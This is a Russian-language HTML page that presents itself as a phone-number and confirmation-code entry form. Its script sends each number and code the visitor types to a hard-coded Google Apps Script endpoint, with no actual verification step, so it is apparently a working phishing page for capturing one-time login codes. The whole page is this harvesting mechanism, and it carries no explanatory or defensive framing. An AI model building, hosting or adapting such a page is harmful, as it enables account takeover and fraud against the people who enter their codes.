<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Ввод номера и кода</title>
  <style>
    body {
      font-family: sans-serif;
      padding: 40px;
      background: #f2f2f2;
    }
    .container {
      max-width: 400px;
      margin: auto;
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    input, button {
      margin: 10px 0;
      padding: 10px;
      width: 100%;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Введите номер телефона:</h2>
    <input type="text" id="phone" placeholder="+374..." />
    <button onclick="savePhone()">Отправить номер</button>

    <div id="codeSection" style="display:none;">
      <h2>Введите код подтверждения:</h2>
      <input type="text" id="code" placeholder="Код" />
      <button onclick="saveCode()">Отправить код</button>
    </div>
  </div>

  <script>
    let savedPhone = '';
    const url = 'https://script.google.com/macros/s/AKfycbzNf1gOLPJXmzsBIuAumpGr-e1fWWwBykrti4w5IURBmMJhQcXZ4WJZ46K00dK2nGt9ow/exec';

    function savePhone() {
      savedPhone = document.getElementById('phone').value.trim();
      if (!savedPhone) return alert('Введите номер!');
      document.getElementById('codeSection').style.display = 'block';

      fetch(url, {
        method: 'POST',
        body: JSON.stringify({ phone: savedPhone, code: '' }),
        headers: { 'Content-Type': 'application/json' }
      });
    }

    function saveCode() {
      const code = document.getElementById('code').value.trim();
      if (!code) return alert('Введите код!');

      fetch(url, {
        method: 'POST',
        body: JSON.stringify({ phone: savedPhone, code: code }),
        headers: { 'Content-Type': 'application/json' }
      }).then(() => {
        alert('Спасибо! Данные сохранены.');
      });
    }
  </script>
</body>
</html>
